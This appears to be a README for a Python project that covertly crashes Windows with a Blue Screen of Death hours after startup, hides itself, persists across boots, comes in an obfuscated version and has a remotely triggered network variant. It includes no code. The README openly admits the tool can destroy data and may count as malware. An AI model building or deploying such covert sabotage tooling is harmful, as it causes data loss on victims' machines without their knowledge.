# bsod_trigger

### What is this?

This is a little python script to trigger a 
**B**lue **S**creen **O**f **D**eath, BSOD for short, after between 3 and 8 
hours from the Windows startup.


### WHY?

Why not?


### DISCLAIMER

I'm not responsible for any data corruption, damaged hardware or any kind of 
damage to your property.

**USE THIS AT YOUR OWN RISK**

_Intended for educational purposes_

Read [LICENSE](LICENSE)


### Dependencies

1. Python 3.6 or newer
   1. Python must be added to _PATH_ (under installation)

_This project requires the user install python and any script_


### How to run

After installing python, you just need to save [bsod.py](bsod.py) 
where nobody can find it and double click it.

I suggest using _obfuscated_ version: [joy.py](joy.py)

After script is executed once, it'll become hidden


### net_bsod.py vs bsod.py 

#### bsod.py

This script runs by its own, it means that a BSOD will be triggered from 3 to 8 
hours since the Windows startup. 

#### net_bsod.py + net_client.py

_n_bsod script_ can accept requests from _client script_, 
making possible to set a timer to trigger a BSOD.

_Python must have a rule in firewall_


### _Is this malware?_

Well, it depends on what usage is given to it.

Since you can actually make someone lost data, it could be considered as such.


### References and tools

#### Tools

- [Python obfuscator](https://development-tools.net/python-obfuscator/)

#### Code references

- [Trigger BSOD with python](https://stackoverflow.com/questions/11254763/is-there-a-way-in-windows-to-throw-a-bsod-on-demand-from-python)
- [Add run python script on startup](https://stackoverflow.com/questions/4438020/how-to-start-a-python-file-while-windows-starts)
- [Run bat file without prompt](https://www.winhelponline.com/blog/run-bat-files-invisibly-without-displaying-command-prompt/)
- [Set file as hidden](https://stackoverflow.com/questions/43441883/how-can-i-make-a-file-hidden-on-windows)
- [Python sockets](https://realpython.com/python-sockets/)
